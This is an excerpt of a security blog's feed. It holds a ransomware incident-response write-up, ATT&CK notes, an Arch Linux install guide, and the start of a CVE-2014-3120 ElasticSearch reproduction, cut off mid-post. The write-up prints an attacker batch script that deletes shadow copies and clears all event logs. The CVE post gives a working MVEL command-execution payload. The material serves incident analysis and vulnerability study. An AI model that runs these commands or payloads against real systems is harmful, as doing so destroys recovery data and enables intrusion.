    <content type="html"><![CDATA[<h1>某国企勒索病毒应急响应</h1><h2 id="整体排查思路">整体排查思路</h2><ul><li>先看日志，要和勒索争分夺秒，你得看这台终端怎么中的毒，哪个IP过来的</li><li>看对外连接，有没有攻击其他人</li><li>看异常进程，父进程，签名，启动项，注册表，dll调用,计划任务,驱动</li><li>关键目录文件排查，感染时间，文件后缀，解密联系方式</li></ul><hr><h5 id="应急开始一定要记住，不要使用删除以及更改文件属性的命令，建议在桌面建立sample文件夹，作为我们存放样本的文件夹">应急开始一定要记住，不要使用删除以及更改文件属性的命令，建议在桌面建立sample文件夹，作为我们存放样本的文件夹</h5><h2 id="检测阶段">检测阶段</h2><p>某国企上午来突然接到通知，总部中了勒索病毒，迅速通知受害主机相关人员对其断网隔离。电话和客户了解以下现场大概情况，由于受害主机是终端PC查明勒索病毒如何进来的，是否有扩散，扩散什么程度，直接重装系统即可。某日上午，远程终端进行排查，发现前一天晚上22:32分左右，来自于安徽的一台终端机器对北京终端进行<strong>3389</strong>爆破，安徽终端密码为0，这你就没办法了对吧。终端PC装有360天擎，但是当我远程过去的时候，360天擎处于关闭状态，应该是攻击者利用某种手段把天擎关闭掉了，并破坏了天擎主动防御模块。</p><h3 id="日志">日志</h3><p>因为甲方这边只有天擎，没有态势感知之类的设备，一切只能看咱自己经验了<br>诶，由于分析日志全是在客户机器上日志什么的都没拿出来，没法给大家分享，我就说说我如何现场百度<strong>logparse</strong> 用法现场分析各种日志</p><h4 id="logparse">logparse</h4><p>你在应急的时候像<strong>logparse</strong>，<strong>autoruns</strong>,<strong>processexplore</strong>,<strong>processmonitor</strong>,还有其他的各种工具是应该直接打包压缩，准备随时传给客户到机器上的</p><blockquote><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p></blockquote><p>上面是下载地址，安装也是比较简单的直接双击打开，点击点击点击即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Log Parser 2.2\LogParser.exe //logparse的路径</span><br></pre></td></tr></table></figure><p>我用到的命令组合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE_NAME,EXTRACT_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;日志的路径.evtx&apos; WHERE EventID=675&quot; &gt; 1.csv</span><br><span class="line">___________</span><br><span class="line">/*字段说明*/</span><br><span class="line">-i:EVT: 指定evtx类型的日志格式，当然也可以有CSV格式的还有IIW3C格式的</span><br><span class="line">TimeGenerated,EXTRACT_TOKEN: 时间戳字段</span><br><span class="line">USERNAME,EXTRACT_TOKEN： 用户名字段</span><br><span class="line">SERVICE_NAME,EXTRACT_TOKEN： 服务名字段</span><br></pre></td></tr></table></figure><p>然后用excle打开csv文件，对其进行处理得到以下表格中的数据，用来后续进行排查</p><table><thead><tr><th>外网IP</th><th>内网IP</th></tr></thead><tbody><tr><td>220.*.184.157</td><td>9.<em>.</em>.241</td></tr><tr><td>95.*.252.94</td><td>9.<em>.</em>.88</td></tr><tr><td>112.*.100.151</td><td>9.<em>.</em>.13</td></tr><tr><td>119.1*.58.165</td><td>9.<em>.</em>.25</td></tr><tr><td>218.1*9.86.210</td><td>9.<em>.</em>.8</td></tr><tr><td>141.9*.81.191</td><td>9.<em>.</em>.50</td></tr><tr><td>2.187.7*.96</td><td>9.<em>.</em>.51</td></tr><tr><td>61.14*.213.18</td><td>9.*.97.123</td></tr><tr><td>193.1*.16.246</td><td>9.<em>.</em>.122</td></tr><tr><td>61.1*7.103.187</td><td>9.*.20.34</td></tr><tr><td>125.*7.40.217</td><td>89.*.62.91</td></tr><tr><td>125.1*7.174.145</td><td>193.1*8.16.250</td></tr><tr><td>193.*8.16.252</td><td>11.*.97.123</td></tr></tbody></table><p>这些机器都是由另一位安服同志排查的，所以后来情况也没和我同步，诶，所以我就不清楚了</p><h3 id="确定感染时间">确定感染时间</h3><p>勒索感染时间为早上5:27分<br><img src="/p/6b6e/2.png" alt></p><h3 id="感染后缀名">感染后缀名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C4H</span><br></pre></td></tr></table></figure><h3 id="解密联系方式">解密联系方式</h3><p><img src="/p/6b6e/1.png" alt></p><h3 id="敏感目录文件">敏感目录文件</h3><p>我们在用户的<strong>temp</strong>目录下发现了一个名称叫做<strong>tmp61DD.tmp.bat</strong>的<strong>bat</strong>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">vssadmin.exe Delete Shadows /All /Quiet</span><br><span class="line">reg delete <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"</span> /va /f</span><br><span class="line">reg delete <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span> /f</span><br><span class="line">reg add <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span></span><br><span class="line"><span class="built_in">cd</span> %userprofile%\documents\</span><br><span class="line">attrib Default.rdp -s -h</span><br><span class="line">del Default.rdp</span><br><span class="line"><span class="keyword">for</span> /F <span class="string">"tokens=*"</span> %1 <span class="keyword">in</span> (<span class="string">'wevtutil.exe el'</span>) DO wevtutil.exe cl <span class="string">"%1"</span>%</span><br></pre></td></tr></table></figure><p>在<strong>C:\Users\lazy\Videos&gt;<strong>目录下发现了黑客爆破的工具</strong>hydra</strong>,NS估计也是黑客的工具，但是被加密了也分析不出来<br><img src="/p/6b6e/3.png" alt></p><h3 id="进程分析">进程分析</h3><p>我们祭出了<strong>AutoRuns</strong>,<strong>ProcessExplorer</strong>,<strong>ProcessMonitor</strong>,这三个工具应该是我们应急的过程中常用的三剑客，其实火绒剑就足够了，但是不太喜欢用这个<br>我们用<strong>autoruns</strong>发现了一个很可疑的东西，就是暴风一键激活的工具，而且2016年就有了，这就很可能构成APT，但是甲方不太重视这里边我们忽略后边在说<br><img src="/p/6b6e/5.png" alt><br>用<strong>ProcessExplorer</strong>发现这个终端一直在请求一个矿池和勒索的IP，那个截图我找不到了<br><img src="/p/6b6e/6.png" alt><br>我们从注册表中看到<br><img src="/p/6b6e/4.png" alt><br>然后，我们在进程中嗨发现iexplore.exe这个程序也不对劲，疑似是dll劫持，截图找不到了<br><img src="/p/6b6e/9.png" alt><br>于是我把所有程序都丢到<strong>virustotal</strong>,发现确实有问题，<br><img src="/p/6b6e/8.png" alt><br>然后我们发现这个勒索的命名都非常奇怪，叫做</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$360Honeypot</span><br><span class="line">$360LockFile</span><br></pre></td></tr></table></figure><p>有没有觉得很熟悉？DLP(数据防泄漏？)这黑客竟然以这个命名，我觉得十分的奇怪，不深究了</p><h2 id="抑制阶段">抑制阶段</h2><p>因为是终端机器，所以也没必要升级打补丁恢复数据什么的直接重装系统就行<br>但是，如果你是碰到的服务器被勒索了，那还是一步一步做把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 对系统进行补丁更新，封堵病毒传播途径；</span><br><span class="line">2. 制定严格的口令策略，避免弱口令；</span><br><span class="line">3. 结合备份的网站日志对网站应用进行全面代码审计，找出攻击者利用的漏洞入口进行封堵；</span><br><span class="line">4. 配合全流量设备对全网中存在的威胁进行分析，排查问题；</span><br></pre></td></tr></table></figure><h3 id="样本取证">样本取证</h3><p>取证的样本大概就是这样<br><img src="/p/6b6e/7.png" alt></p><h2 id="根除阶段">根除阶段</h2><p>重装系统</p><h2 id="相关安全建议">相关安全建议</h2><ol><li>使用强密码</li><li>别什么垃圾软件都用，激活买个序列号比啥不强，或者搭个KMS服务器比啥不强，用什么暴风激活</li></ol>]]></content>
    
    <summary type="html">
    
      某国企上午来突然接到通知，总部中了勒索病毒，一次勒索病毒的应急响应
    
    </summary>
    
    
      <category term="应急响应" scheme="https://hexchristmas.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
      <category term="勒索病毒" scheme="https://hexchristmas.github.io/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK矩阵自己的理解和思考</title>
    <link href="https://hexchristmas.github.io/p/574.html"/>
    <id>https://hexchristmas.github.io/p/574.html</id>
    <published>2020-06-10T16:59:49.000Z</published>
    <updated>2020-06-10T11:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1>ATT&amp;CK矩阵自己的理解和思考</h1><h2 id="什么是ATT-CK">什么是ATT&amp;CK</h2><blockquote><p>会随着自己的理解，不断对每块内容，每个文字进行更新，大家如果有什么不同见解或者更好对见解可以提issues</p></blockquote><p>ATT&amp;CK(Adversarial Tactics, Techniques, and Common Knowledge),翻译过来就是<code>对抗策略，技巧和常识</code>。按名字可能不太好理解，它是由一家做美国军方做威胁建模公司MITRE提出的，ATT&amp;CK与其他的模型并不相同，比如说CVSS它是侧重漏洞评估，还比如说DREAD它是侧重风险评估，而ATT&amp;CK完全站在攻击者的视角来描述攻击中各阶段用到的技术模型。</p><h2 id="ATT-CK分类">ATT&amp;CK分类</h2><table><thead><tr><th>技术域(TechnologyDomains)</th><th>平台(PlatformsDefined)</th></tr></thead><tbody><tr><td>Enterprise</td><td>Linux,macos,Windows</td></tr><tr><td>Mobile</td><td>Android,ios</td></tr></tbody></table><h2 id="设计理念">设计理念</h2><ul><li>基于攻击者的视角</li><li>通过红队经验案例中使用和出现的攻击手法</li><li>抽象化可以更好的将攻击手段和防守措施联系起来</li></ul><h2 id="ATT-CK抽象化模型">ATT&amp;CK抽象化模型</h2><blockquote><p>为什么要有这个，我觉得因为安全本身就是比较乱的，这一块哪一块的，攻击者在攻击时候思路大多数都是杂乱无章的，打到内网不知道该做什么，如何做，所以这个抽象模型把每一次完整的攻击梳理出来，用的什么工具，什么样的技术，怎么样的战术策略，所以这个抽象化模型可以理解为红队攻击手法模型，用来突破企业的安全防御，对于企业安全运营可以用来评估自己安全运营中心成熟度</p></blockquote><p><img src="/p/574/2.jpg" alt></p><hr><p><strong>这张关系图是官方的，下面的是我自己理解的</strong><br><img src="/p/574/1.png" alt></p><h3 id="战术-Tactics">战术 (Tactics)</h3><p>战术在ATT&amp;CK中可以理解为红队使用攻击手法的标签(持久性，发现信息，横向移动，执行文件和泄露数据… …)，每个标签的战术目标也是不同的，战术目标其实就是采取行动的原因，比如说执行被定义为战术，表示可以在本地或远程执行恶意代码的技术，这种战术通常与初始攻击结合使用，用来获取拿到权限后执行命令，以及横向移动的访问权限</p><h3 id="技术-Techniques">技术 (Techniques)</h3><p>技术在ATT&amp;CK中可以理解为红队实现战术目标的方式，比如说攻击者可能会用凭据转储对用来获取网络中可被控制的访问权限</p><h3 id="组-Groups">组 (Groups)</h3><p>组的概念其实是区别于团队和个人，ATT&amp;CK主要关注APT组织和其他黑客组织，例如有经济目的的黑客组织</p><h3 id="软件-Software">软件 (Software)</h3><p>ATT&amp;CK针对攻击者入侵过程中会使用不同的软件把软件分为三大类：</p><ul><li>渗透测试工具，如burpSuite、nmap、metasploit、mimikatz等</li><li>系统自带的实用程序，如widows的netstat，tasklist，powershell</li><li>恶意软件，旨在被攻击者用于恶意目的的商业，闭源或开源软件，如plugx、chopstick</li></ul>]]></content>
    
    <summary type="html">
    
      随着自己的理解，不断对每块内容，每个文字进行更新，大家如果有什么不同见解或者更好对见解可以提issues
    
    </summary>
    
    
      <category term="att&amp;ck" scheme="https://hexchristmas.github.io/tags/att-ck/"/>
    
  </entry>
  
  <entry>
    <title>archlinux安装</title>
    <link href="https://hexchristmas.github.io/p/e13.html"/>
    <id>https://hexchristmas.github.io/p/e13.html</id>
    <published>2020-06-10T01:02:34.000Z</published>
    <updated>2020-06-10T01:15:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1>archlinux安装</h1><p><img src="/p/e13/11.png" alt></p><h2 id="emmm-about-install">emmm_about_install</h2><blockquote><p>archlinux安装区别于debian、ubuntu、centos，如果你有折腾过以上linux发行版的经验的这篇文章可能对于你比较简单，arch没有一键图形化的安装，从网络，分区，引导，到桌面都需要你自己去装，而且archlinux它是一个对于debian用户来说新的包管理器pacman，pacman要比你想象终端包管理器强大但多，arch的wiki应该是世界上最好的<strong>linux知识库</strong>，当然这种说法并不准确，但我确实认为它是最好的wiki</p></blockquote><p>在准备开始前，建议你制作一个WinPE方便你恢复系统，由于你可能并不是十分熟练物理机安装arch，所以最后选择一整块没有数据的硬盘，避免你操作意外，在执行命令的时候一定要小心，仔细，当然如果你熟练linux，你也可以准备一块Linux live，我尽量能把我踩的坑都回忆起来，因为有一段时间没有折腾了，也许以后也不会折腾了。</p><h2 id="ArchLinux">ArchLinux</h2><p><img src="/p/e13/1.png" alt></p><h2 id="网络">网络</h2><p>建议使用有线，先插网线在开机，就不用使用wifi-menu这个东西了，这个东西实话讲我一直也没弄明白，你插上网线在ping，就能看到网络通了</p><h4 id="编辑pacman的源">编辑pacman的源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure><p><img src="/p/e13/10.png" alt><br>将China的源移到到最前</p><h2 id="分区">分区</h2><p>对于分区，老生常谈的问题了，笔者刚开始折腾的时候也是各种踩坑，踩来踩去才把分区理解的差不多，如果你们对于分区划分，每个分区划多大合适可以看一下我写个</p><blockquote><p><a href="https://hexchristmas.github.io/p/4fe48e26.html">https://hexchristmas.github.io/p/4fe48e26.html</a></p></blockquote><h3 id="关于EFI分区">关于EFI分区</h3><p>因为笔者电脑是雷神911se，这本子默认不支持传统BIOS引导，只能UEFI，所以笔者对于UEFI折腾也就比较多</p><blockquote><p>EFI分区一定给大一点，又不是没空间，大于512MB，最好给1024MB，要不然你grub-install安装引导时候就会出现no space，切记</p></blockquote><h3 id="关于swap分区">关于swap分区</h3><blockquote><p>swap分区，很多人说一定要分，说这样那样原因，因为我笔记本内存比较大所以我觉得不分也是可以的。因为在安装的时候linux会自动给你分。</p></blockquote><h3 id="关于-根分区">关于**/**根分区</h3><blockquote><p>根分区，我基本把剩下的空间都会划给根。</p></blockquote><h3 id="home分区，以及其他一些分区">home分区，以及其他一些分区</h3><blockquote><p>关于home分区，如果你不想每次linux崩溃都要啪啦啪啦配置一堆东西，那就建议找一块机械硬盘，把机械硬盘划给/home，因为我的固态硬盘太小，而且我是macos+archlinux双系统，mac不认linux的分区，所以没办法，机械硬盘没法划给home 。</p></blockquote><h2 id="使用什么工具，怎么划分">使用什么工具，怎么划分</h2><p>知道大家可能都是第一次折腾，怕出错，我可能尽量的写详细，写的通俗易懂一些。</p><h3 id="找到要装arch的磁盘名称">找到要装arch的磁盘名称</h3><p>因为我就一块硬盘<br><img src="/p/e13/7.gif" alt></p><h3 id="各种分区工具">各种分区工具</h3><p>磁盘分区工具挺多的，比如说<strong>cfdisk,parted,fdisk</strong></p><blockquote><p>cfdisk 完全是图形化操作。比较简单，这里我其实是把swap划分出来了，是为了大家能看懂</p></blockquote><h4 id="EFI">EFI</h4><p><img src="/p/e13/4.gif" alt></p><h4 id="swap">swap</h4><p><img src="/p/e13/5.gif" alt></p><h4 id>/</h4><p><img src="/p/e13/6.gif" alt></p><blockquote><p>parted 这个有点难了，不过熟能生巧，刚开始操作你可能看不懂，理解一下就差不多，这里一样也是把swap给大家划分出来</p></blockquote><h4 id="EFI，swap，">EFI，swap，/</h4><p><img src="/p/e13/8.gif" alt></p><blockquote><p>fdisk 这个工具也是一样不简单，不过也一样熟能生巧，+1G，就是在2048基础上加上1G，它是一段一段的，可以去百度了解一下</p></blockquote><p><img src="/p/e13/9.gif" alt></p><h2 id="挂载分区">挂载分区</h2><p>挂载**/<strong>分区到</strong>/mnt**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt</span><br></pre></td></tr></table></figure><p>创建EFI挂载点,并挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/boot/EFI</span><br><span class="line">mount /dev/sda1 /mnt/boot/EFI</span><br></pre></td></tr></table></figure><h2 id="安装基本软件包">安装基本软件包</h2><blockquote><p>基本的软件包包括了系统运行所必需的所有软件包。比如有 GNU BASH shell、文件压缩工具、文件系统管理工具、C 语言库、压缩工具、Linux 内核及其模块，类库、系统工具、USB 设备工具、Vi 文本编辑器等等</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap -i /mnt base base-devel</span><br></pre></td></tr></table></figure><h2 id="生成fstab文件">生成fstab文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure><h2 id="检查fstab是否生成有问题">检查fstab是否生成有问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># &lt;file system&gt;                           &lt;dir&gt;         &lt;type&gt;    &lt;options&gt;             &lt;dump&gt; &lt;pass&gt;</span><br><span class="line"></span><br><span class="line">tmpfs                                     /tmp          tmpfs     nodev,nosuid          0      0</span><br><span class="line"></span><br><span class="line">UUID=24f28fc6-717e-4bcd-a5f7-32b959024e26 /     ext4              defaults,noatime      0      1</span><br><span class="line">UUID=03ec5dd3-45c0-4f95-a363-61ff321a09ff /home ext4              defaults,noatime      0      2</span><br><span class="line">UUID=4209c845-f495-4c43-8a03-5363dd433153 none  swap              defaults              0      0</span><br></pre></td></tr></table></figure><p>如果你和我一样，在options 列有relatime 可改成noatime能够提升性能</p><h2 id="切换新安装到系统">切换新安装到系统</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><h2 id="update-system">update system</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure><h2 id="system-settings">system settings</h2><h3 id="安装常用软件">安装常用软件</h3><p>pacman -S vim sudo</p><h3 id="设置时钟">设置时钟</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure><p>使用hwclock命里该设置硬件时钟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hwclock --systohc --utc</span><br></pre></td></tr></table></figure><h3 id="中文环境">中文环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/locale.gen</span><br><span class="line">...</span><br><span class="line">en_US.UTF-8 UTF-8</span><br><span class="line">zh_CN.UTF-8 UTF-8</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>找到以上两行取消注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure><p>生成新的<br>创建<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"># vim /etc/locale.conf</span><br><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure></p><h3 id="设置主机名">设置主机名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo archlinux &gt; /etc/hostname</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/hosts</span><br><span class="line">127.0.0.1    localhost</span><br><span class="line">::1            localhost</span><br><span class="line">127.0.1.1    arch.localdomain    archlinux</span><br></pre></td></tr></table></figure><h3 id="设置有线连接">设置有线连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable dhcpcd</span><br></pre></td></tr></table></figure><h3 id="设置无线连接">设置无线连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S iw wpa_supplicant dialog</span><br></pre></td></tr></table></figure><h3 id="设置root密码">设置root密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure><h3 id="添加普通用户">添加普通用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -g users -G wheel -s /bin/bash archuser</span><br></pre></td></tr></table></figure><p>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">visudo</span><br></pre></td></tr></table></figure></p><h2 id="安装引导程序">安装引导程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot/EFI --bootloader-id=grub</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><h2 id="卸载挂载的分区并重启">卸载挂载的分区并重启</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exit   //退出到chroot</span><br><span class="line">umount -r /dev/sda3</span><br><span class="line">umount -r /dev/sda1</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><blockquote><p>如果你此时重启之后发现引导没生效，那么大概率事件就是你哪一步出问题了，这就需要你的linux排查经验了，拿到你的linux live进行急救,希望以下方法可以挽救你的grub</p></blockquote><h2 id="再次手动生成grub">再次手动生成grub</h2><p>复制内核文件到esp分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /boot/vmlinuz-linux /esp/vmlinuz-linux</span><br><span class="line">cp /boot/initramfs-linux.img /esp/initramfs-linux.img</span><br><span class="line">cp /boot/initramfs-linux-fallback.img /esp/initramfs-linux-fallback.img</span><br></pre></td></tr></table></figure><p>安装并更新efi启动文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bootctl --path=/esp install</span><br><span class="line">bootctl --path=/esp update</span><br></pre></td></tr></table></figure><p>编辑启动文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /esp/loader/loader.conf</span><br></pre></td></tr></table></figure><p>文件中有一行注释，不需要动，直接添加如下内容即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">default arch-*</span><br><span class="line">timeout 3（这个数值可以改为0）</span><br><span class="line">editor 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /esp/loader/entries/arch.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title Arch Linux</span><br><span class="line">linux /vmlinuz-linux</span><br><span class="line">initrd /initramfs-linux.img</span><br><span class="line">options root=PARTUUID=14420948-2cea-4de7-b042-40f67c618660 rw</span><br></pre></td></tr></table></figure><p>注意以上的<strong>14420948-2cea-4de7-b042-40f67c618660</strong>这个是你的分区的UUID，你需要手动去找<br>命令是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 blkid -s PARTUUID -o value /dev/sdxY</span><br></pre></td></tr></table></figure><p>找到之后替换就行，再次开机重启就应该有引导了</p><h2 id="安装kde桌面">安装kde桌面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xorg xorg-server xorg-xinit xorg-apps plasma kde-applications sddm sddm-kcm networkmanager net-tools alsa-utils pulseaudio pulseaudio-alsa</span><br></pre></td></tr></table></figure><p>启动网络管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable NetworkManager</span><br></pre></td></tr></table></figure><p>登录器自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sddm</span><br></pre></td></tr></table></figure><p>安装字体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S wqy-microhei wqy-microhei-lite wqy-bitmapfont wqy-zenhei ttf-arphic-ukai ttf-arphic-uming adobe-source-han-sans-cn-fonts adobe-source-han-serif-cn-fonts noto-fonts-cjk</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      记录自己折腾archlinux的一些操作，我尽量能把我踩的坑都回忆起来，因为有一段时间没有折腾了，也许以后也不会折腾了，专注于安全研究。
    
    </summary>
    
    
      <category term="archlinux" scheme="https://hexchristmas.github.io/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2014-3120_ElasticSearch命令执行漏洞分析复现</title>
    <link href="https://hexchristmas.github.io/p/2d0c.html"/>
    <id>https://hexchristmas.github.io/p/2d0c.html</id>
    <published>2020-06-09T15:41:06.000Z</published>
    <updated>2020-06-09T07:44:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2014-3120_ElasticSearch命令执行漏洞分析复现</h1><h2 id="概述">概述</h2><p>ElasticSearch是一个基于全文检索引擎Lucene的分布式、高扩展、高实时的检索与数据分析引擎，支持全文检索，结构化检索以及数据分析。</p><h2 id="受影响版本">受影响版本</h2><p>ElasticSearch ≤ 1.2</p><h2 id="分析环境">分析环境</h2><p>docker pull lazychristmas/cve-2014-3120:v1.0</p><h2 id="漏洞分析">漏洞分析</h2><p>ElasticSearch1.2之前有动态脚本执行的功能，这个功能其实可以让我们很方便的查询出数据进行加工处理，但ElasticSearch用的脚本引擎是MVEL，这个引擎是没有任何安全机制的，通过_search方法的参数传入恶意代码，远程执行任意MVEL表达式和Java代码。</p><h2 id="漏洞复现">漏洞复现</h2><p>构造payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">      <span class="attr">"filtered"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: &#123;</span><br><span class="line">          <span class="attr">"match_all"</span>: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="attr">"command"</span>: &#123;</span><br><span class="line">            <span class="attr">"script"</span>: <span class="string">"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>利用这个漏洞必须要有一条数据，我们需要在创建一下</p><figure class="highlight plain"><table><tr><td 